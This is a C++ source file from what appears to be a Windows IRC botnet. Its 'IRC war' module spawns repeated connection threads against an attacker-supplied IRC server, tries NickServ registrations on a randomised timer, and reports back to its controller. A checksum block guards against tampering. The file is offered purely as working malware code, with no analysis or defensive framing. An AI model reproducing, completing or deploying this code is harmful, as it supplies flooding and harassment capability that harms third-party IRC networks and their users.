#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
DWORD WINAPI RegisterWithWarIrc(LPVOID)
{
    bRegisterOnWarIrc = TRUE;
    unsigned short usSeconds = 0;

    while(bRemoteIrcBusy && bRegisterOnWarIrc)
    {
        for(unsigned short us = 0; us < usSeconds; us++)
        {
            if(!bRemoteIrcBusy)
                break;

            Sleep(1000);
        }

        if(!bRemoteIrcBusy)
            break;

        for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
            AttemptToRegisterWithNickServ(us);

        usSeconds = GetRandNum(60) + 15;
    }

    return 1;
}

DWORD WINAPI StartIrcWarThread(LPVOID)
{
    bRemoteIrcBusy = TRUE;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
    {
        strcpy(cChannel, cServer);
        strcpy(cAuthHost, cServer);
        strcpy(cServer, cChannel);
    }
    // <!-------! CRC AREA STOP !-------!>

    for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
    {
        HANDLE hThread = CreateThread(NULL, NULL, ConnectionsToRemoteIrc, NULL, NULL, NULL);
        if(hThread)
            CloseHandle(hThread);

        Sleep(500);
    }

    return 1;
}

void StartIrcWar(char *cWarHost, unsigned short usWarPort)
{
    HANDLE hThread = CreateThread(NULL, NULL, StartIrcWarThread, NULL, NULL, NULL);

    if(hThread)
        CloseHandle(hThread);

    SendSuccessfulStartedAttemptedRemoteIrcConnections(cWarHost, usWarPort);
}
#endif
#endif
